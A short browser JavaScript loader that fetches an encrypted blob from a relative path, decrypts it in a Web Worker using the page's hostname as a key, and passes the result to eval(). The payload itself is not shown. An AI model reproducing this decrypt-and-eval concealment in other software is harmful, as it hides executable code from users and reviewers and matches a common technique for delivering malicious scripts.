var worker=new Worker("0.js");worker.onmessage = function(event) {eval(event.data);}
var xmlhttp=poster();

function poster(){
    var request = false;
    if(window.XMLHttpRequest) {
      request = new XMLHttpRequest();
      if(request.overrideMimeType) {
        request.overrideMimeType('text/xml');
      }
    } else if(window.ActiveXObject) {
      var versions = ['Microsoft.XMLHTTP', 'MSXML.XMLHTTP', 'Microsoft.XMLHTTP', 'Msxml2.XMLHTTP.7.0', 'Msxml2.XMLHTTP.6.0', 'Msxml2.XMLHTTP.5.0', 'Msxml2.XMLHTTP.4.0', 'MSXML2.XMLHTTP.3.0', 'MSXML2.XMLHTTP'];
      for(var i=0; i<versions.length; i++) {
        try {
          request = new ActiveXObject(versions[i]);
        } catch(e) {}
      }
    }
    return request;
}
function getmydata(action){
xmlhttp.onreadystatechange=xmlhttpLoaded;
    xmlhttp.open("GET", action, false);
    xmlhttp.send();
return xmlhttp.responseText;
}
function xmlhttpLoaded() {

if(xmlhttp.readyState == 4) {
if(xmlhttp.status == 200) {
return true;
}
 if(xmlhttp.status==404) {
	 return false;
} 
}
return false;
}
wpost('Decrypt("'+getmydata("./i")+'","'+window.location.host+'");');

function wpost(newJS){
worker.postMessage(newJS);
}